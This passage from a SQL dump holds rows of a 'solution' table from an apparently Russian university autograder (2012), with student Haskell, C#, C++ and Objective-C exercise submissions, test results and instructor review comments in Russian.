t2;\r\n\r\n	return 0;\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1308, 39, '533223', '2012-10-02 07:32:18', 1, 'data Tree = Empty| Node Integer Tree Tree deriving Show\r\n\r\nminHeight tree = mH2 1000 0 tree\r\n\r\nmH2 min res (Node _ (Node intl ll lr) (Node intr rl rr)) = if res < min \r\n				then if (lmin<min)\r\n					then mH2 lmin (1+res) (Node intr rl rr)\r\n					else mH2 min (1+res) (Node intr rl rr)\r\n				else min\r\n				where lmin = mH2 min (1+res) (Node intl ll lr)\r\n  --- OK, я бы ту же идею короче записал, но это мы обсудим\r\nmH2 min res (Node _ Empty (Node intr rl rr)) = if (res<min)\r\n				then mH2 min (1+res) (Node intr rl rr)\r\n				else min\r\nmH2 min res (Node _ (Node intr rl rr) Empty) = if (res<min)\r\n				then mH2 min (1+res) (Node intr rl rr)\r\n				else min\r\nmH2 _ res _ = res', '<br/>Тесты успешно пройдены!'),
(1309, 50, '3431532', '2012-10-02 10:30:37', 0, '//\n\n//  main.m\n\n//  sdfsdfsdf\n\n//\n\n//  Created by Алексей Кретов on 02.10.12.\n\n//  Copyright (c) 2012 Digital Desing. All rights reserved.\n\n//\n\n\n\n#import <UIKit/UIKit.h>\n\n\n\n#import "AppDelegate.h"\n\n\n\n\n\ntypedef BOOL (^PredicateBlock)(NSInteger value);\n\n\n\n@interface IntTree : NSObject\n\n{\n\n@private\n\n   NSInteger value;\n\n}\n\n\n\n@property (nonatomic, assign) IntTree *left;\n\n@property (nonatomic, assign) IntTree *right;\n\n\n\n+ (id)treeNodeWithInt:(NSInteger)_value;\n\n\n\n- (id)initWithValue:(NSInteger)_value;\n\n- (BOOL)any:(PredicateBlock) predicateBlock;\n\n\n\n@end\n\n\n\n@implementation IntTree\n\n\n\n@synthesize left, right;\n\n\n\n- (id)initWithValue:(NSInteger)_value\n\n{\n\n    if(self = [super init])\n\n    {\n\n        value = _value;\n\n    }\n\n    return self;\n\n}\n\n\n\n+ (id)treeNodeWithInt:(NSInteger)_value\n\n{\n\n    return [[[IntTree alloc] initWithValue:_value] autorelease];\n\n}\n\n\n\n- (BOOL)any:(PredicateBlock) predicateBlock\n\n{\n\n    return predicateBlock(value) || [self.left any:predicateBlock] || [self.right any:predicateBlock];\n\n}\n\n\n\n- (void)dealloc\n\n{\n\n    [super dealloc];\n\n}\n\n\n\n@end\n\n\n\n\n\nint main(int argc, char *argv[])\n\n{\n\n    IntTree *node1 = [IntTree treeNodeWithInt:5];\n\n    IntTree *node2 = [IntTree treeNodeWithInt:3];\n\n    IntTree *node3 = [IntTree treeNodeWithInt:7];\n\n    IntTree *node4 = [IntTree treeNodeWithInt:21];\n\n    \n\n    node1.left = node2;\n\n    node2.left = node3;\n\n    node2.right = node4;\n\n    \n\n    NSLog(@"%d", [node1 any:^BOOL(NSInteger value) {\n\n        return !(value%2);\n\n    }]);\n\n\n\n}\n\n\n\n\n', '<br/>Тесты успешно пройдены!'),
(1310, 50, '3431532', '2012-10-02 10:31:01', 1, '//\r\n\r\n//  main.m\r\n\r\n//  sdfsdfsdf\r\n\r\n//\r\n\r\n//  Created by Алексей Кретов on 02.10.12.\r\n\r\n//  Copyright (c) 2012 Digital Desing. All rights reserved.\r\n\r\n//\r\n\r\n\r\n\r\n#import <UIKit/UIKit.h>\r\n\r\n\r\n\r\n#import "AppDelegate.h"\r\n\r\n\r\n\r\n\r\n\r\ntypedef BOOL (^PredicateBlock)(NSInteger value);\r\n\r\n\r\n\r\n@interface IntTree : NSObject\r\n\r\n{\r\n\r\n@private\r\n\r\n   NSInteger value;\r\n\r\n}\r\n\r\n\r\n\r\n@property (nonatomic, assign) IntTree *left;\r\n\r\n@property (nonatomic, assign) IntTree *right;\r\n\r\n\r\n\r\n+ (id)treeNodeWithInt:(NSInteger)_value;\r\n\r\n\r\n\r\n- (id)initWithValue:(NSInteger)_value;\r\n\r\n- (BOOL)any:(PredicateBlock) predicateBlock;\r\n\r\n\r\n\r\n@end\r\n\r\n\r\n\r\n@implementation IntTree\r\n\r\n\r\n\r\n@synthesize left, right;\r\n\r\n\r\n\r\n- (id)initWithValue:(NSInteger)_value\r\n\r\n{\r\n\r\n    if(self = [super init])\r\n\r\n    {\r\n\r\n        value = _value;\r\n\r\n    }\r\n\r\n    return self;\r\n\r\n}\r\n\r\n\r\n\r\n+ (id)treeNodeWithInt:(NSInteger)_value\r\n\r\n{\r\n\r\n    return [[[IntTree alloc] initWithValue:_value] autorelease];\r\n\r\n}\r\n\r\n\r\n\r\n- (BOOL)any:(PredicateBlock) predicateBlock\r\n\r\n{\r\n\r\n    return predicateBlock(value) || [self.left any:predicateBlock] || [self.right any:predicateBlock];\r\n\r\n}\r\n\r\n\r\n\r\n- (void)dealloc\r\n\r\n{\r\n\r\n    [super dealloc];\r\n\r\n}\r\n\r\n\r\n\r\n@end\r\n\r\n\r\n\r\n\r\n\r\nint main(int argc, char *argv[])\r\n\r\n{\r\n\r\n    IntTree *node1 = [IntTree treeNodeWithInt:5];\r\n\r\n    IntTree *node2 = [IntTree treeNodeWithInt:3];\r\n\r\n    IntTree *node3 = [IntTree treeNodeWithInt:7];\r\n\r\n    IntTree *node4 = [IntTree treeNodeWithInt:21];\r\n\r\n    \r\n\r\n    node1.left = node2;\r\n\r\n    node2.left = node3;\r\n\r\n    node2.right = node4;\r\n\r\n    \r\n\r\n    NSLog(@"%d", [node1 any:^BOOL(NSInteger value) {\r\n\r\n        return !(value%2);\r\n\r\n    }]);\r\n\r\n\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1311, 37, '3742311', '2012-10-02 10:41:24', 1, 'minsum (h1:h2:t) = fst (foldl ((a, b) x -> if b + x < a then (b + x, x) else (a, x)) (h1 + h2, h2) t)', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1312, 43, '3742311', '2012-10-02 11:31:27', 0, 'euclidtmp a b (a1, a2) (b1, b2) = if (mod a b) == 1 then (a1 - (div a b) * b1, a2 - (div a b) * b2) else euclidtmp b (mod a b) (b1, b2) (a1 - (div a b) * b1, a2 - (div a b) * b2)\r\neuclid a b = euclidtmp a b (1, 0) (0, 1)', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1313, 43, '3742311', '2012-10-02 11:34:48', 1, 'euclidtmp a b (a1, a2) (b1, b2) = if (mod a b) == 1 then (a1 - (div a b) * b1, a2 - (div a b) * b2) else euclidtmp b (mod a b) (b1, b2) (a1 - (div a b) * b1, a2 - (div a b) * b2)\r\neuclid 1 0 = (1, 1)\r\neuclid 0 1 = (1, 1)\r\neuclid a b = euclidtmp a b (1, 0) (0, 1)', '<br/>Тесты успешно пройдены!'),
(1314, 35, '5656962', '2012-10-02 14:57:30', 1, 'isosc (x1, y1) (x2, y2) (x3, y3) = \r\n\r\n let \r\n\r\n	a = sqrt((x2 - x1)^2 + (y2 - y1)^2) \r\n\r\n	b = sqrt((x3 - x2)^2 + (y3 - y2)^2) \r\n\r\n	c = sqrt((x3 - x1)^2 + (y3 - y1)^2) \r\n\r\n	in if a == b || b == c || a == c\r\n\r\n		then True\r\n\r\n		else False\r\n', '<br/>Тесты успешно пройдены!'),
(1315, 36, '5656962', '2012-10-02 14:58:12', 1, 'cubeTable n = map(x -> (x, x^3)) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1316, 38, '5656962', '2012-10-02 14:58:29', 0, '', 'Не удалось вычислить выражение "height (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1317, 38, '5656962', '2012-10-02 14:58:45', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\n\r\nheight Empty = 0\r\n\r\nheight (Node _ Empty Empty) = 0\r\n\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n', '<br/>Тесты успешно пройдены!'),
(1318, 40, '5656962', '2012-10-02 14:59:31', 1, 'frame n = map(i -> if i == 1 || i == n\r\n\r\n						then map(x -> 1) [1..n]\r\n\r\n						else map(x -> if x == 1 || x == n then 1 else 0) [1..n]) [1..n]\r\n\r\n			\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1319, 41, '5656962', '2012-10-02 15:20:11', 0, 'countOdd xs = foldr (i res -> if (i `mod` 2 == 0 )\r\n\n								then res\r\n\n								else res + 1) 0 xs\n', 'Не удалось вычислить выражение "countOdd1 [2, 3, 4, 8, 5, 33, 9]", проверьте правильность синтаксиса'),
(1320, 41, '5656962', '2012-10-02 15:21:23', 1, 'countOdd xs = foldr (i res -> if (i `mod` 2 == 0 )\r\n\r\n								then res\r\n\r\n								else res + 1) 0 xs\r\n\r\n				\r\n\r\ncountOdd1 xs = length(filter odd xs)\r\n', '<br/>Тесты успешно пройдены!'),
(1321, 42, '5656962', '2012-10-02 16:36:39', 1, 'myfoldl f e (x:xs) = myfoldl f (e `f` x) xs\r\n\r\nmyfoldl f e [] = e \r\n', '<br/>Тесты успешно пройдены!'),
(1322, 44, '3607492', '2012-10-02 16:41:23', 0, 'check a 0 x1 y1 x2 y2 = if (a==1) then (x2,y2) else if (a==(-1)) then ((-x2),(-y2))	else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)then check a b 0 1 1 0 else (snd (check b a 0 1 1 0), fst (check b a 0 1 1 0))\r\nfunc2 a b c  =  (c * fst x , c * snd x) where x = euclid a b\r\nfunc 0 0 0 = (0,1)\r\nfunc a b c = if (mod c (gcd a b) /=0) then (0,0) else func2 (div a (gcd a b)) (div b (gcd a b)) (div c (gcd a b))\r\ndioph [a1,b1,c1,d1] [0,0,0,_] = [0,0,0]\r\ndioph [a1,b1,c1,d1] [a2,0,0,d2] = [x,y,z] where [z,y,x] = dioph [c1,b1,a1,d1] [0,0,a2,d2]\r\ndioph [a1,b1,c1,d1] [a2,b2,0,d2] = [x,y,z] where [x,z,y] = dioph [a1,c1,b1,d1] [a2,0,b2,d2]\r\ndioph [a1,b1,0,d1] x = dioph x [a1,b1,0,d1]\r\ndioph [a1,b1,c1,d1] [a2,b2,c2,d2] = [x,y,div (d2 - a2*x -b2*y) c2] where (x,y) = func (c2*a1-c1*a2) (c2*b1-c1*b2) (c2*d1-c1*d2) ', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,0,1,2] [0,1,0,0] in (x+z, y)", проверьте правильность синтаксиса'),
(1323, 44, '3607492', '2012-10-02 17:09:55', 0, 'check a 0 x1 y1 x2 y2=if(a==1)then (x2,y2)else if(a==(-1))then((-x2),(-y2))else(0,0)\n\ncheck a b x1 y1 x2 y2=check b (a - b * (div a b))(x2 - x1 * (div a b))(y2 - y1 * (div a b)) x1 y1\n\neuclid 0 1=(0,1)\n\neuclid 1 0=(1,0)\n\neuclid 0 _=(0,0)\n\neuclid _ 0=(0,0)\n\neuclid a b=if (a>b) then check a b 0 1 1 0 else (snd(check b a 0 1 1 0),fst(check b a 0 1 1 0))\n\nfunc2 a b c=(c*fst x,c*snd x)where x = euclid a b\n\nfunc 0 0 0=(0,1)\n\nfunc a b c=if(mod c(gcd a b)/=0)then(checktrace c(gcd a b))else func2 (div a(gcd a b))(div b(gcd a b))(div c(gcd a b))\n\ndioph [a,0,0,b] x=dioph x [a,0,0,b]\n\ndioph [0,a,0,b] x=dioph x [0,a,0,b]\n\ndioph x [0,0,a,b]=dioph [0,0,a,b] x\n\ndioph [a1,b1,c1,d1] [0,a,0,b]=[x,y,z]where[x,z,y]=dioph [0,0,a,b][a1,c1,b1,d1]\n\ndioph [a1,b1,c1,d1] [a,0,0,b]=[x,y,z]where[z,y,x]=dioph [0,0,a,b] [c1,b1,a1,d1]\n\ndioph [0,0,c1,d1] [a2,b2,0,d2]=if(mod d1 c1==0)then[d2*fst(euclid a2 b2),d2*snd(euclid a2 b2),div d1 c1]else[0,0,0]\n\ndioph [a1,0,c1,d1] [a2,b2,0,d2]=[x,y,z]where[z,y,x]=dioph [c1,0,a1,d1][0,b2,a2,d2]\n\ndioph [a1,b1,c1,d1] [a2,b2,0,d2]=[x,y,z]where[x,z,y]=dioph [a1,c1,b1,d1] [a2,0,b2,d2]\n\ndioph [a1,b1,0,d1] x=dioph x [a1,b1,0,d1]\n\ndioph [a1,b1,c1,d1] [a2,b2,c2,d2]=[x,y,div (d2-a2*x-b2*y)c2]where(x,y)=func (c2*a1-c1*a2)(c2*b1-c1*b2)(c2*d1-c1*d2) \n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1324, 37, '5656962', '2012-10-02 17:20:00', 1, 'minsum (x:y:xs) = foldr (i res -> min ((fst i) + (snd i)) res) (x + y) (zip (x:y:xs) (y:xs))\r\n', '<br/>Тесты успешно пройдены!'),
(1325, 33, '442421', '2012-10-02 18:02:33', 1, '   --- Вообще-то на эту задачу вышел срок вчера. Засчитано, но, пожалуйста, присылайте задачи\r\n   --- вовремя, в следующий раз я не засчитаю. \r\nstatic double integral(Func<double,double> f, double a, double b)\r\n        {\r\n            if (b < a) return -integral(f, b, a);\r\n            double res = 0;\r\n            double h = 0.001;\r\n            int n = (int) ((b - a) / h);\r\n            if (n < 100)\r\n            {\r\n                n = 100;\r\n                h = (b - a) / n;\r\n            }\r\n            for (int i = 0; i < n; ++i)\r\n            {\r\n                res += h * f(a + i * h);\r\n            }\r\n            return res;\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {            \r\n            Console.WriteLine(integral(x => x*x, 0, 1));\r\n            \r\n        }', '<br/>Тесты успешно пройдены!'),
(1326, 42, '383483', '2012-10-02 18:38:40', 1, 'myfoldl f z xs = mfld xs f z\r\nmfld [] f res = res\r\nmfld (x:xs) f res = mfld xs f (f res x) \r\n{--все-таки без reverse--} \r\n    --- OK, очень хорошо!\r\n    --- Не очень понятно, правда, зачем вы ввели mfld, она же отличается от myfoldl только порядком параметров. \r\n    --- Те ваш совершенно правильный код можно было написать прямо для myfoldl', '<br/>Тесты успешно пройдены!'),
(1327, 35, '383483', '2012-10-02 19:01:38', 0, 'isosc a b c = checkEq [(getLen a b),(getLen b c),(getLen a c)]\r\ngetLen a b = sqrt(((fst a) - (fst b))^2 + ((snd a) - (snd b))^2)\r\ncheckEq (x:[]) = False\r\ncheckEq (x:xs) \r\n      | x==head xs = True\r\n      | otherwise = checkEq xs ', 'Выражение имеет неправильное значение: isosc (2,2) (0, 2) (2, 0)'),
(1328, 49, '472848', '2012-10-02 19:09:46', 1, 'class BinaryTree<T>\r\n{\r\n  public T Value { get; set; }\r\n  public BinaryTree<T> Left { get; set; }\r\n  public BinaryTree<T> Right { get; set; }\r\n\r\n  public bool Any(Predicate<T> pred)\r\n  {\r\n    if (pred(Value))\r\n    {\r\n      return true;\r\n    }\r\n    if (Left != null && Left.Any(pred))\r\n    {\r\n      return true;\r\n    }\r\n    if (Right != null)\r\n    {\r\n      return Right.Any(pred);\r\n    }\r\n    return false;\r\n  }\r\n\r\n  public BinaryTree(T val)\r\n  {\r\n    Value = val;\r\n    Left = Right = null;\r\n  }\r\n}\r\n\r\nclass Program\r\n{\r\n  static void Main(string[] args)\r\n  {\r\n    BinaryTree<int> tree = new BinaryTree<int>(10);\r\n    tree.Left = new BinaryTree<int>(12);\r\n    tree.Right = new BinaryTree<int>(9);\r\n    tree.Right.Left = new BinaryTree<int>(17);\r\n    Console.WriteLine(tree.Any(x => x % 17 == 0));\r\n  }\r\n}', '<br/>Тесты успешно пройдены!'),
(1329, 35, '383483', '2012-10-02 19:11:19', 1, 'isosc a b c = checkDifferent [(getLen a b),(getLen b c),(getLen a c)]\r\ngetLen a b = sqrt(((fst a) - (fst b))^2 + ((snd a) - (snd b))^2)\r\ncheckDifferent (y:xs) = f1 (map (x->y==x) xs) xs\r\n   --- Или можно немного короче написать с помощью section  f1 (map (y==) xs) xs (и то же дальше несколько раз)\r\nf1 [] (x:[]) = False\r\nf1 [] (y:xy) = f1 (map (x->y==x) xy) xy \r\nf1 (x:xs) xy = if (x==True) then True else f1 xs xy\r\n   --- Я бы в данном случае наверное просто выписал бы три проверки на ==, получилось бы короче\r\n   --- Но ОК, так тоже хорошо. ', '<br/>Тесты успешно пройдены!'),
(1330, 45, '5772638', '2012-10-02 19:21:03', 1, 'class Program\r\n    {\r\n       static  List<byte[]> ListOfLists = new List<byte[]>();     \r\n       static Random random = new Random();\r\n        static void  Rand(int n, int m) \r\n        {\r\n            byte[] SubList;            \r\n            for (int i = 0; i < n;i++ )\r\n            {\r\n                SubList = new byte[m];\r\n                random.NextBytes(SubList) ;                  \r\n                ListOfLists.Add(SubList);  \r\n            }   \r\n        }\r\n        static Boolean IfHasOdd() \r\n        {\r\n            bool b = ListOfLists.All(x=>x.Any(y=>y%2==0));            \r\n            return b;\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            Rand(5,5);\r\n            Console.WriteLine(IfHasOdd());\r\n            Console.ReadKey();\r\n        }\r\n    }', '<br/>Тесты успешно пройдены!'),
(1331, 50, '472848', '2012-10-02 19:25:21', 1, '#include <iostream>\r\n\r\ntemplate<class T> class BinaryTree\r\n{\r\npublic:\r\n  T Value;\r\n  BinaryTree<T> *Left;\r\n  BinaryTree<T> *Right;\r\n\r\n  BinaryTree(T val)\r\n  {\r\n    Value = val;\r\n    Left = 0;\r\n    Right = 0;\r\n         --- Просто как замечание, это все немного лучше писать в списке инициализации\r\n  }\r\n\r\n  template<class Predicate> bool Any(Predicate pred)\r\n  {\r\n    if (pred(Value))\r\n    {\r\n      return true;\r\n    }\r\n    if (Left && Left->Any(pred))\r\n    {\r\n      return true;\r\n    }\r\n    if (Right)\r\n    {\r\n      return Right->Any(pred);\r\n    }\r\n    return false;\r\n  }\r\n};\r\n\r\nvoid main()\r\n{\r\n  BinaryTree<int> *tree = new BinaryTree<int>(10);\r\n  tree->Left = new BinaryTree<int>(12);\r\n  tree->Right = new BinaryTree<int>(9);\r\n  tree->Right->Left = new BinaryTree<int>(17);\r\n  tree->Any([](int x){return x % 17 == 0;}) ? printf("OK\r\n") : printf("FAIL\r\n");\r\n}', '<br/>Тесты успешно пройдены!'),
(1332, 37, '383483', '2012-10-02 19:29:59', 1, 'minsum (x:xs) = minimum (map (i -> fst i + snd i) (zip (x:xs) xs))', '<br/>Тесты успешно пройдены!'),
(1333, 47, '318210', '2012-10-02 19:31:26', 0, 'powerset[] = [[]]\r\n\npowerset[h] = [[], [h]]\r\n\npowerset (x : xs) = powerset1 (x : xs) [[]]\r\n\npowerset1 (x : xs) ans | length(xs) == 0 = ans ++ conc ans x\r\n\n			| otherwise = powerset1 (xs) (ans ++ conc ans x)\r\n\nconc (xs) h = conc1 (xs) h []\r\n\nconc1 (x : xs) h res | length(xs) == 0 = res ++ [h:x]\r\n\n			| otherwise =  conc1 xs h (res ++ [h:x])\n', 'Выражение имеет неправильное значение: elem [1,3] (powerset [1,2,3])'),
(1334, 47, '318210', '2012-10-02 19:39:07', 1, 'powerset[] = [[]]\r\n\r\npowerset[h] = [[], [h]]\r\n\r\npowerset (x : xs) = powerset1 (x : xs) [[]]\r\n\r\npowerset1 (x : xs) ans | length(xs) == 0 = ans ++ conc ans x\r\n   --- я бы вместо этого написал отдельное правило powerset1 [] xs = xs\r\n   --- Тогда бы кстати и правило powerset [h] не потребовалось, оно бы следовало из остальных.\r\n\r\n			| otherwise = powerset1 (xs) (ans ++ conc ans x)\r\n\r\nconc (xs) h = conc1 (xs) h []\r\n\r\nconc1 (x : xs) h res | length(xs) == 0 = res ++ [reverse(h:reverse(x))]\r\n   --- Или вместо reverse(h:reverse(x)) можно просто x ++ [h]\r\n   --- А вместо res ++ [...] можно просто ... . res - ведь во внешнем списке неважно, в каком порядке идут элементы\r\n   --- Кроме того conc это у вас фактически переписанный map, вы к каждому элементу xs \r\n   --- применяете операцию приписывания h. Те можно было просто использовать map\r\n			| otherwise =  conc1 xs h (res ++ [reverse(h:reverse(x))])', '<br/>Тесты успешно пройдены!'),
(1335, 48, 'Deutsche', '2012-10-02 20:03:09', 1, '-- вместо id теоретически может стоять любая функция (стандартная или собственно определённая), которую надо \r\n-- посчитать от списка, она подставляется вместо обобщённого обозначения f внутри foldr; в данном случае id, \r\n-- т.к. нас интересует просто сам инвертированный список\r\nmyreverse s = foldr (x1 f s1 -> f (x1 : s1)) id s []', '<br/>Тесты успешно пройдены!'),
(1336, 39, '44060', '2012-10-02 20:43:08', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nminHeight'' pMin ma Empty = pMin\r\nminHeight'' pMin ma (Node _ Empty Empty) = min pMin ma\r\n    --- Тут можно видимо вернуть просто ma. Во первых это правильно, ma - это и есть расстояние, вл вторых\r\n    --- мне кажется такой адгоритм, что всегда ma <= pMin, вы глубже просто не зайдете.\r\nminHeight'' pMin ma (Node _ left right) = if pMin <= ma + 1 then pMin else\r\n	let rezult = minHeight'' pMin (ma+1) left in\r\n	if rezult > ma + 1 then minHeight'' rezult (ma+1) right\r\n        else rezult\r\n    \r\nminHeight tree = round (max 0 (minHeight'' (100500) 0 tree))', '<br/>Тесты успешно пройдены!'),
(1337, 38, '419046', '2012-10-02 21:03:11', 1, ' \r\n\r\ndata Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\n\r\nheight (Node _ l r) = max  (height l) (height r) + 1\r\n', '<br/>Тесты успешно пройдены!'),
(1338, 41, '419046', '2012-10-02 21:16:47', 1, 'countOdd xs = foldr (x res -> if mod x 2 == 1\r\n\r\n				then res + 1\r\n\r\n				else res) 0 xs\r\n\r\ncountOdd1 xs = length (filter (/=0) (map (x -> mod x 2) xs))\r\n', '<br/>Тесты успешно пройдены!'),
(1339, 42, '419046', '2012-10-02 21:31:21', 1, 'myfoldl _ e [] = e\r\n\r\nmyfoldl f e (x:xs) = myfoldl f (f e x) xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1340, 40, '419046', '2012-10-02 21:55:52', 1, 'frame n = map (x -> if (x == 1)||(x == n)\r\n\r\n		      then take n [1,1..]\r\n\r\n		      else (map (x -> if (x == 1)||(x == n)\r\n\r\n					then 1\r\n\r\n					else 0)) [1..n] ) [1..n] \r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1341, 40, '51559263', '2012-10-03 00:28:28', 1, 'f1 0 _ = []\r\n\r\nf1 n x = x : f1 (n-1) x\r\n\r\n\r\n\r\nf2 0 _ _ = []\r\n\r\nf2 1 x _ = [x]\r\n\r\nf2 n x y = x : f1 (n-2) y ++ [x]\r\n\r\n\r\n\r\nframe n = f2 n ( f1 n 1 ) ( f2 n 1 0 )\r\n', '<br/>Тесты успешно пройдены!'),
(1342, 48, 'erwert', '2012-10-03 00:45:18', 2, 'myreverse h = foldr (a b -> (foldr (x y -> (x:y)) [a] b)) [] h\r\n   --- Нет, это не по условию, к сожалению.\r\n   --- В условии "Функция должна работать за линейное время. \r\n   --- Технически это означает, что нельзя использовать операцию ++ [x] или каким-то другим \r\n   --- способом приписывать очередной элемент к концу списка на каждом шаге работы foldr."\r\n   --- А вы как раз приписываете в конец, и функция у вас работает за квадратичное время..', '<br/>Тесты успешно пройдены!'),
(1343, 35, '528420', '2012-10-03 11:53:35', 1, '-- расстояние между двумя точками\r\nlen (a,b) (c,d) = sqrt ((c-a)^2+(d-b)^2)\r\n-- попарно сравниваю длины сторон треугольника\r\nisosc (x1, y1) (x2, y2) (x3, y3) | len (x1, y1) (x2, y2) == len (x1, y1) (x3, y3) = True\r\n                                 | len (x1, y1) (x3, y3) == len (x2, y2) (x3, y3) = True\r\n								 | len (x2, y2) (x3, y3) == len (x1, y1) (x2, y2) = True\r\n								 | otherwise = False\r\n', '<br/>Тесты успешно пройдены!'),
(1344, 36, '528420', '2012-10-03 11:54:16', 1, 'cubeTable n = map(x -> (x,x^3)) [1..n]', '<br/>Тесты успешно пройдены!'),
(1345, 37, '528420', '2012-10-03 11:55:00', 1, '-- делаю пары из подряд стоящих элементов\r\ncouple xs = zip (init xs) (tail xs)\r\n-- считаю сумму каждой пары\r\nsumcouple xs = map((x,y) -> x+y) (couple xs)\r\n-- ищу минимум\r\nminsum [x,y] = x+y\r\nminsum xs = foldr min (1/0) (sumcouple xs)', '<br/>Тесты успешно пройдены!'),
(1346, 40, '528420', '2012-10-03 11:55:18', 1, 'row t n  | t == 1 = map(x -> 1) [1..n]\r\n         | t == n = map(x -> 1) [1..n]\r\n		 | otherwise = map(x -> if (x==1) || (x==n) then 1 else 0) [1..n]\r\nframe n = map (x -> row x n) [1..n]', '<br/>Тесты успешно пройдены!'),
(1347, 39, '397095', '2012-10-03 12:31:32', 2, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nminHeight t = m t 0 (-1)\r\n\r\nm (Node _ Empty Empty) n mn = n\r\nm (Node _ l r) n mn = if n > mn && mn >= 0 then mn else min (m l (n+1) mn) (m r (n+1) mn)\r\nm Empty n mn = 1000000000000\r\n\r\n--- Нет, так у вас на самом деле быдут обхоиться все вершины. Вот пример, из котороо это видно\r\n--- (Я добавил в вашу программу тестовые печати)import Debug.Trace\r\n--- data Tree = Empty | Node Integer Tree Tree\r\n--- minHeight t = m t 0 (-1)\r\n--- m (Node x Empty Empty) n mn = trace (show x) n\r\n--- m (Node _ l r) n mn = if n > mn && mn >= 0 then mn else min (m l (n+1) mn) (m r (n+1) mn)\r\n--- m Empty n mn = 1000000000000\r\n--- test = minHeight (Node 1 (Node 2 Empty Empty) (Node 3  (Node 4 Empty Empty)  (Node 5 Empty Empty)))\r\n--- Напечатаются все варшины, можете проверить, хотя 4 и 5 вообще-то обходит смысла нет\r\n--- Попробуйте исправить, пожалуйста.\r\n--- Подсказка: надо после обхода левого поддерева использовать то. что мы нашли. при обходе правого поддерева.\r\n', '<br/>Тесты успешно пройдены!'),
(1348, 41, '528420', '2012-10-03 12:56:02', 1, 'countOdd xs = foldr (x y -> if x `mod` 2 == 1 then 1+y else 0+y ) 0 xs\r\n\r\n-- оставляю только нечетные в списке\r\ncheck1 xs = filter (x -> x `mod` 2 == 1) xs\r\n-- считаю длину списка (кол-во элементов)\r\ncountOdd1 xs = length (check1 xs)', '<br/>Тесты успешно пройдены!'),
(1349, 42, '528420', '2012-10-03 13:18:18', 0, 'myfoldl1 f e [x] = f e x\r\nmyfoldl1 f e (x:xs) = f x (myfoldl1 f e xs)\r\n\r\nmyfoldl f e xs = myfoldl1 f e (reverse xs)', 'Не удалось вычислить выражение "myfoldl (+) 10 []", проверьте правильность синтаксиса'),
(1350, 42, '528420', '2012-10-03 13:19:17', 0, 'myfoldl1 f e [] = e \r\nmyfoldl1 f e [x] = f e x\r\nmyfoldl1 f e (x:xs) = f x (myfoldl1 f e xs)\r\n\r\nmyfoldl f e xs = myfoldl1 f e (reverse xs)', 'Выражение имеет неправильное значение: let f x y = 2*x+y in myfoldl f 2 [3,5]'),
(1351, 42, '528420', '2012-10-03 13:23:23', 0, 'myfoldl1 f e [x] = f e x\r\nmyfoldl1 f e (x:xs) = f x (myfoldl1 f e xs)\r\n\r\nmyfoldl f e [] = e \r\nmyfoldl f e xs = myfoldl1 f e (reverse xs)', 'Выражение имеет неправильное значение: let f x y = 2*x+y in myfoldl f 2 [3,5]'),
(1352, 42, '528420', '2012-10-03 13:26:00', 0, 'myfoldl1 f e [] = e\r\nmyfoldl1 f e (x:xs) = f x (myfoldl1 f e xs)\r\n\r\n\r\nmyfoldl f e xs = myfoldl1 f e (reverse xs)', 'Выражение имеет неправильное значение: myfoldl (^) 2 [3]'),
(1353, 42, '528420', '2012-10-03 13:34:50', 0, 'myfoldl1 f e [] = e\r\nmyfoldl1 f e (x:xs) = f x (myfoldl1 f e xs)\r\n\r\n\r\nmyfoldl f e xs = myfoldl1 f (last xs) ((reverse (init xs)) ++ [e])', 'Не удалось вычислить выражение "myfoldl (+) 10 []", проверьте правильность синтаксиса'),
(1354, 42, '528420', '2012-10-03 14:00:14', 1, 'myfoldl1 f e [x] = f e x\r\nmyfoldl1 f e (x:xs) = f (myfoldl1 f e xs) x\r\n\r\nmyfoldl f e [] = e\r\nmyfoldl f e xs = myfoldl1 f e (reverse xs)', '<br/>Тесты успешно пройдены!'),
(1355, 39, '397095', '2012-10-03 14:17:50', 1, '-- Да, я почему-то забыл использовать то, что написал :)\r\n\r\ndata Tree = Empty | Node Integer Tree Tree\r\n\r\nminHeight t = m t 0 (-1)\r\n\r\nm (Node _ Empty Empty) n mn = n\r\nm (Node _ l r) n mn = \r\n	if n > mn && mn >= 0 \r\n		then mn \r\n		else\r\n			let\r\n				left = m l (n+1) mn\r\n				right = m r (n+1) left\r\n			in\r\n				min left right\r\nm Empty n mn = 1000000000000', '<br/>Тесты успешно пройдены!'),
